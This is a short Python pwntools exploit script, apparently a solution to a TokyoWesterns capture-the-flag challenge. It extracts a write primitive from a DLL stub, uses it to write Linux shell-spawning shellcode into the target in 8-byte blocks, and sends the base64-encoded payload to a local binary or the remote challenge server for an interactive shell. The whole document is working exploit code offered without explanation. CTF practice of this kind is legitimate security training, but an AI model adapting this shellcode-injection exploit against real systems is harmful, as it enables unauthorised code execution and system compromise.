from pwn import *
from base64 import b64encode

context.arch = 'amd64'

with open('ilstub-cpy.dll', 'rb') as f:
    func = f.read()[612: 612 + 0x2B]

offset = 32

preamble = func[0: 0x1E].replace(b'\x41' * 8, p64(offset))
write_primitive = func[0x1E:]

shellcode = group(8, asm(shellcraft.amd64.linux.sh()))

exploit = preamble[:]
for block in shellcode:
    exploit += write_primitive.replace(b'\x42' * 8, bytes(block).ljust(8, b'\x90'))

if args.REMOTE:
    p = remote('pwn02.chal.ctf.westerns.tokyo', 23541)
else:
    p = process('./il')
p.sendlineafter(b'spell:\n', b64encode(exploit))
p.interactive()
